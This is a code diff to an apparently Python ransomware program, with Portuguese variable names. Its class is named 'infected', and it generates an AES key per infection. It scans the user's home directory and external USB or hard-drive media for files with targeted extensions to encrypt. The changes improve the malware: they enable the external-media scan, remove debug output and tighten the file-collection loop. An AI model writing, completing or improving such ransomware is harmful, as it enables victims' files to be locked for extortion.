@@ -39,8 +39,8 @@ class infected():
 
 
 def get_user():
-    caminho = os.environ['HOME']+'/Desktop/'
-    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
+    caminho = os.path.expanduser('~') + '/Desktop/'
+    caminho2 = os.path.expanduser('~') + '/Área\ de\ Trabalho/'
     if(os.path.isdir(caminho)):
         caminho_correto = caminho
     elif(os.path.isdir(caminho2)):
@@ -80,8 +80,7 @@ def menu(senha_AES):
     home = os.environ['HOME'] # /home/user is the start point
     comeco = time.time()
     listar(senha_AES, home, tipos_arquivos)
-    print(time.time()-comeco)
-    #listar_media(senha_AES,tipos_arquivos)
+    listar_media(senha_AES,tipos_arquivos)
 
 # look's for external media such as usb / hd's
 def listar_media(senha_AES, tipos_arq):
@@ -109,7 +108,7 @@ def listar(chave_AES,diretorio, tipos_arq):
                 for ext in tipos_arq:
                     if(extensao[1] == ext): # found file with the extension
                         encrypt_list.append(file_found)
-    print(encrypt_list)
+                        break
 
 '''
     for element in encrypt_list: # encrypt happens here
@@ -122,8 +121,8 @@ def listar(chave_AES,diretorio, tipos_arq):
 
 # Generate random AES key for each infection
 def gera_chave_AES():
-    caminho = os.environ['HOME']+'/Desktop/'
-    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
+    caminho = os.path.expanduser('~') + '/Desktop/'
+    caminho2 = os.path.expanduser('~') + '/Área\ de\ Trabalho/'
     if(os.path.isdir(caminho)):
         caminho_correto = caminho
     elif(os.path.isdir(caminho2)):
